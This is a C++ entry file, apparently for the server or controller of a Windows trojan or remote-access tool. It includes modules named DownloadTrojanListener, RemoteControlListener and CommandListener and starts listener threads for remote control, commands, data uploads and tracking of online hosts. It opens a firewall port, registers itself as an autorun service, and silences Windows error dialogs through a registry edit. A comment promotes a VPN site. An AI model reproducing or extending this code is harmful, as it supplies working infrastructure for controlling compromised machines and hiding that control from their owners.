#include <windows.h>
#include <WinSock.h>
#include <shlwapi.h>
#include <time.h>

#include "main.h"
#include "Public.h"

#include "zconf.h"
#include "zlib.h"

#include "LoginWindow.h"
#include "DownloadTrojanListener.h"
#include "DownloadProgramListener.h"
#include "CommandListener.h"
#include "DataListener.h"
#include "RemoteControlListener.h"
#include "OnlineManager.h"

#include <Dbghelp.h>

#include <map>
#include "PublicFunc.h"
#include "mysqlOper.h"
#include "test.h"
#include "recommit.h"

#pragma comment(lib,"dbghelp.lib")
#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"zlib.lib")
#pragma comment(lib,"kernel32.lib")
#pragma comment(lib,"user32.lib")
#pragma comment(lib,"gdi32.lib")

using namespace std;


//https://www.vpnyu.com/page/testvpn.html this is a vpn test website,you can get 2 free vpn accounts

DWORD dwIP = 0;





int InitProgram()
{
#ifdef _DEBUG
	mytest();
#endif

	int iRet = CheckIfProgramExist();
	if (iRet)
	{
		WriteLog("program has been already running\r\n");
		ExitProcess(0);
	}

	WSAData stWsa = { 0 };
	iRet = WSAStartup(WSASTARTUP_VERSION, &stWsa);
	if (iRet)
	{
		WriteLog("WSAStartup error\r\n");
		return FALSE;
	}
	char szCurrentDir[MAX_PATH] = { 0 };

	char szCurFileName[MAX_PATH] = { 0 };
	iRet = GetModuleFileNameA(0, szCurFileName, MAX_PATH);
	iRet = GetPathFromFullName(szCurFileName, szCurrentDir);
	iRet = SetCurrentDirectoryA(szCurrentDir);

	char szCommandDir[MAX_PATH];
	lstrcpyA(szCommandDir, szCurrentDir);
	lstrcatA(szCommandDir, COMMAND_DIR_NAME);
	lstrcatA(szCommandDir, "\\");
	iRet = MakeSureDirectoryPathExists(szCommandDir);

	lstrcpyA(szCommandDir, szCurrentDir);
	lstrcatA(szCommandDir, UPLOAD_FILE_DIR_NAME);
	lstrcatA(szCommandDir, "\\");
	iRet = MakeSureDirectoryPathExists(szCommandDir);

	lstrcpyA(szCommandDir, szCurrentDir);
	lstrcatA(szCommandDir, DOWNLOAD_FILE_DIR_NAME);
	lstrcatA(szCommandDir, "\\");
	iRet = MakeSureDirectoryPathExists(szCommandDir);

	lstrcpyA(szCommandDir, szCurrentDir);
	lstrcatA(szCommandDir, DOWNLOADPROGRAM_PATH);
	lstrcatA(szCommandDir, "\\");

	dwIP = GetIPFromConfigFile();
	if (dwIP == 0 || dwIP == 0xffffffff)
	{
		dwIP = INADDR_ANY;
		char szShowInfo[1024];
		wsprintfA(szShowInfo, "not found ip config file:%s%s error\r\n", szCurrentDir, IP_CONFIG_FILE);
		WriteLog(szShowInfo);
	}
	dwIP = INADDR_ANY;

	iRet = OpenFireWallPort();
	if (iRet == FALSE)
	{
		return FALSE;
	}

#ifndef _DEBUG
	PublicFunction::addService(szCurFileName, "");
	PublicFunction::autorun();
#endif

#ifdef USE_MYSQL
	MySql::initLock();
#endif

	iRet = system("reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Windows Error Reporting\" /v \"DontShowUI\" /t REG_DWORD /d 1 /f");

	return TRUE;
}








int __stdcall WinMain(__in HINSTANCE hInstance, __in_opt HINSTANCE hPrevInstance, __in LPSTR lpCmdLine, __in int nShowCmd)
{
	int iRet = 0;

#ifdef NEED_LOGIN_WINDOW
	iRet = GetSecondsFromStartDate();
	iRet = DialogBoxParamA(hInstance, (LPSTR)IDD_DIALOG1, 0, (DLGPROC)LoginWindow, 0);
	int error = GetLastError();
	if (iRet == FALSE && ERROR == FALSE)
	{
		ExitProcess(0);
	}
	CloseHandle(CreateThread(0, 0, (LPTHREAD_START_ROUTINE)CheckProductValidation, 0, 0, 0));
#endif

	iRet = InitProgram();
	if (iRet == 0)
	{
		WriteLog("InitProgram error\r\n");
		ExitProcess(0);
	}
	else {
		WriteLog("program start ok\r\n");
	}


	DWORD cmdid = 0;

	HANDLE hRemoteControlThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)RemoteControlServer::RemoteControlListener, 0, 0, 0);
	CloseHandle(hRemoteControlThread);


	HANDLE hCmdListenThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)CommandListener::NetWorkCommandListener, 0, 0, &cmdid);
	CloseHandle(hCmdListenThread);

	HANDLE hDataRecvThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)DataListener::NetWorkDataListener, 0, 0, 0);
	CloseHandle(hDataRecvThread);



	// 	HANDLE hDownloadThread = CreateThread(0,0,(LPTHREAD_START_ROUTINE)DownloadTrojanListener,0,0,0);
	// 	CloseHandle(hDownloadThread);
	// 
	// 	HANDLE hDownloadProgThread = CreateThread(0,0,(LPTHREAD_START_ROUTINE)DownloadProgramListener,0,0,0);
	// 	CloseHandle(hDownloadProgThread);

	HANDLE hGetOnlineInfo = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)OnlineManager::RefreshOnlineInfo, 0, 0, 0);
	CloseHandle(hGetOnlineInfo);

	HANDLE hThreadRecommit = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Recommit::recommit, 0, 0, 0);
	CloseHandle(hThreadRecommit);

	while (TRUE)
	{
		Sleep(0xffffffff);
	}

	WSACleanup();

	ExitProcess(0);

	return TRUE;
}
